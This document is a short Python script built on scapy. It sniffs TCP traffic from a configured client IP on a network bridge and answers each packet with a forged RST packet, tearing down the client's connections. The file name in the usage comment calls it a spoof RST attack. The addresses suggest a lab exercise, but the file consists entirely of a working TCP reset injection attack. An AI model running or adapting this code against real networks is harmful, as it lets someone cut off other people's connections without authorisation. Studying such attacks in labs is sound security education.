#! /usr/bin/env python3

from scapy.all import TCP, IP, send, sniff

CLIENT_IP = '192.168.65.1'  # FIXME: Change this to the correct IP address
IFACE = 'br-19aac25c891f'  # FIXME: Change this to the correct interface
# ifconfg -a to get the interface name


def spoof_rst(pkt):
    # if pkt[IP].dst != target_ip:
    #    return
    print("Sending RST packet")
    # Create a new IP packet with the source and destination IP addresses swapped
    ip = IP(dst=CLIENT_IP, src=pkt[IP].dst)
    # Create a new TCP packet with the source and destination port numbers
    # swapped and the RST flag set
    tcp = TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport,
              seq=pkt[TCP].ack, flags='R')
    # Combine the IP and TCP packets to create a new packet
    spoof_pkt = ip / tcp
    # Send the packet
    # print(spoof_pkt.show())
    send(spoof_pkt)


if __name__ == '__main__':
    # Sniff packets with the specified filter and call the spoof_rst function
    print('sniffing and spoofing packets...')
    sniff(iface=IFACE, filter=f'tcp and src host {CLIENT_IP}', prn=spoof_rst)
    # Usage: python3 sniff_spoof_rst_attack.py
    # Example: python3 sniff_spoof_rst_attack.py
